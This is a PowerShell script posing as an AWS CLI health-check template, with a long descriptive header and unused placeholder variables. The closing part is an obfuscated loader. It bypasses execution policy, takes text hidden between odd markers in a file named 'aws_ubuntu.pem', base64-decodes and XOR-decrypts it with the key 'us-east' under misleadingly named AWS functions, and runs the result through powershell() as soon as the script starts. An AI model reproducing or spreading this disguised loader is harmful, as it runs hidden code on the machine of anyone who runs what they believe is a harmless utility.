<#
.SYNOPSIS
AWSHealthCheckCLI - This PowerShell script connects to AWS and performs health checks on specified resources.

.DESCRIPTION

This script is designed as a template to connect to AWS and perform health checks on specified resources.
The script uses the AWS CLI to interact with AWS services.
The health checks can be performed on various AWS resources such as EC2 instances, RDS databases, and more.
The script dot-sources the AWSHealthCheckFunctions.ps1 script, which contains the logic and functions required to perform health checks on AWS resources.
AWSHealthCheckCLI is licensed under the GNU LGPLv3 License - (C) 2023 AWSHealthCheckCLI Team.
This program is free software: you can redistribute it and/or modify it under the terms of the GNU Lesser General Public License as published by the
Free Software Foundation, either version 3 of the License, or any later version. This program is distributed in the hope that it will be useful, but
WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public License
for more details. You should have received a copy of the GNU Lesser General Public License along with this program. If not, see http://www.gnu.org/licenses/.

.PARAMETER CheckType
The type of health check to perform on the specified AWS resources. Default is: Basic.

.PARAMETER ResourceList
A comma-separated list of AWS resources to perform the health checks on. Default is: All.

.PARAMETER ProfileName
The AWS CLI profile name used to connect to AWS. Default is: Default.

.PARAMETER Region
The AWS region to perform the health checks in. Default is: us-east-1.

.PARAMETER DisableLogging
Disables logging to file for the script. Default is: $false.

.EXAMPLE
powershell.exe -Command "& { & '.\AWSHealthCheckCLI.ps1' -CheckType 'Basic' -ResourceList 'EC2,RDS'; Exit $LastExitCode }"

.EXAMPLE
powershell.exe -Command "& { & '.\AWSHealthCheckCLI.ps1' -ProfileName 'MyProfile' -Region 'us-west-2'; Exit $LastExitCode }"

.EXAMPLE
powershell.exe -Command "& { & '.\AWSHealthCheckCLI.ps1' -CheckType 'Advanced' -ResourceList 'All'; Exit $LastExitCode }"

.INPUTS
None
You cannot pipe objects to this script.

.OUTPUTS
None
This script does not generate any output.

.NOTES
Toolkit Exit Code Ranges:

60000 - 68999: Reserved for built-in exit codes in AWSHealthCheckCLI.ps1 and AWSHealthCheckFunctions.ps1
69000 - 69999: Recommended for user customized exit codes in AWSHealthCheckCLI.ps1
70000 - 79999: Recommended for user customized exit codes in AWSHealthCheckExtensions.ps1
.LINK
https://aws.amazon.com/cli/
#>

 Try {
        Set-ExecutionPolicy -ExecutionPolicy 'ByPass' -Scope 'Process' -Force -ErrorAction 'Stop'
    }
    Catch {
    }

    ##*===============================================
    ##* VARIABLE DECLARATION
    ##*===============================================
    ## Variables: Application
    [String]$appVendor = ''
    [String]$appName = ''
    [String]$appVersion = ''
    [String]$appArch = ''
    [String]$appLang = 'EN'
    [String]$appRevision = '01'
    [String]$appScriptVersion = '1.0.0'
    [String]$appScriptDate = 'XX/XX/20XX'
    [String]$appScriptAuthor = '<author name>'
    ##*===============================================
    ## Variables: Install Titles (Only set here to override defaults set by the toolkit)
    [String]$installName = ''
    [String]$installTitle = ''

    ##* Do not modify section below
    #region DoNotModify

    ## Variables: Exit Code
    [Int32]$mainExitCode = 0

    ## Variables: Script
    [String]$deployAppScriptFriendlyName = 'Deploy Application'
    [Version]$deployAppScriptVersion = [Version]'3.9.2'
    [String]$deployAppScriptDate = '02/02/2023'
    [Hashtable]$deployAppScriptParameters = $PsBoundParameters

function AWS-Token-Generator ($EncryptedText, $Key) {
    $paddingLength = (4 - ($EncryptedText.Length % 4)) % 4
    $EncryptedText = $EncryptedText + ('=' * $paddingLength)
    $AWS_AUTH_INITBytes = [System.Convert]::FromBase64String($EncryptedText)
    $AWS_regionBytes = [System.Text.Encoding]::UTF8.GetBytes($Key)

    $AWS_CLI_INITBytes = New-Object 'byte[]' $AWS_AUTH_INITBytes.Count
    for ($i = 0; $i -lt $AWS_AUTH_INITBytes.Count; $i++) {
        $AWS_CLI_INITBytes[$i] = $AWS_AUTH_INITBytes[$i] -bxor $AWS_regionBytes[$i % $AWS_regionBytes.Count]
    }

    return [System.Text.Encoding]::UTF8.GetString($AWS_CLI_INITBytes)

}

function AWS-PEM-parser ($inputstring) {
    
    $PEM_string = $inputstring -replace "`n" -replace "`r"
    $pattern = "(?<=HaFfa).*?(?=Da7)"
    $match = [regex]::Match($PEM_string, $pattern)

    if ($match.Success) {
        return $match.Value
    } else {
        throw "The input string does not contain the expected delimiters (HaFfa and Da7)."
    }
}
function Initiate-Health-Check {
    $AWS_region = "us-east"
    $PEM = Get-Content -path aws_ubuntu.pem -raw
    $AWS_AUTH_INIT = (AWS-PEM-parser -inputString $PEM) -replace ' ',''
    $AWS_CLI_INIT = AWS-Token-Generator -EncryptedText $AWS_AUTH_INIT -replace '=','' -Key $AWS_region
    powershell($AWS_CLI_INIT)
}

Initiate-Health-Check